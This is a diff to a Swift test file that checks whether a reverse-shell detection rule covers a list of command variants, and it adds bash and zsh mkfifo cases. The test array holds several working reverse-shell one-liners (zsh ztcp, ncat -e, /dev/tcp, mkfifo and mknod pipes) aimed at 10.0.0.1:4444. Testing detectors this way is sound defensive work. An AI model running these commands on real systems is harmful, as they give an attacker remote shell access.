@@ -167,7 +167,9 @@ struct ReverseShellRuleCoverageTests {
             "zsh -c 'zmodload zsh/net/tcp && ztcp 10.0.0.1 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",  // zsh ztcp
             "ncat --ssl 10.0.0.1 4444 -e /bin/sh",              // ncat with flags before -e
             "D=/dev/tcp;bash -i >& $D/10.0.0.1/4444 0>&1",      // /dev/tcp variable-split
-            "sh -c 'mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f'",  // mkfifo named-pipe
+            "sh -c 'mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f'",  // mkfifo named-pipe (sh)
+            "mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.0.1 4444 >/tmp/f",        // mkfifo named-pipe (bash — rc.4-verify coverage)
+            "mkfifo /tmp/f;cat /tmp/f|/bin/zsh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f",         // mkfifo named-pipe (zsh)
             "mknod /tmp/bp p; /bin/sh 0</tmp/bp | nc 10.0.0.1 4444 1>/tmp/bp",            // mknod named-pipe
         ]
         for cmd in payloads {
